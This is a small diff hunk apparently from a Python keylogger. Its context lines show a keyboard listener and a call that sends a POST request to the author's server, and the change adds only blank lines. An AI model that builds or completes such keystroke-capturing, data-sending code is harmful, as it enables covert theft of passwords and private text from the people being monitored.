@@ -67,3 +67,5 @@ with keyboard.Listener(
     # We start of by sending the post request to our server.
     send_post_req()
     listener.join()
+
+        
